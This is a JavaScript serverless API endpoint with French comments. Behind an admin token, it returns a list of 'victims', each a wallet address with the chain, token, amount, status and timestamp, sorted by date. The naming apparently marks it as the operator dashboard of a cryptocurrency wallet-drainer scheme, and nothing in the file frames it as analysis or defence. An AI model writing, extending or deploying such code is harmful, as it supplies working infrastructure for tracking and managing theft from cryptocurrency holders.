import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

  // 🔐 Vérification du token admin
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  const token = authHeader.split(' ')[1];
  if (token !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    // Récupère la liste des adresses stockée dans "victims:list"
    let addresses = await kv.get('victims:list');
    if (!addresses) {
      addresses = [];
    }

    const victims = [];
    for (const address of addresses) {
      const data = await kv.hgetall(`victim:${address}`);
      if (data) {
        victims.push({
          address,
          chain: data.chain || '',
          token: data.token || '',
          amount: data.amount || '0',
          status: data.status || 'unknown',
          timestamp: data.timestamp ? Number(data.timestamp) : null
        });
      }
    }

    // Tri par date décroissante
    victims.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    return res.status(200).json(victims);
  } catch (error) {
    console.error('Error fetching victims:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
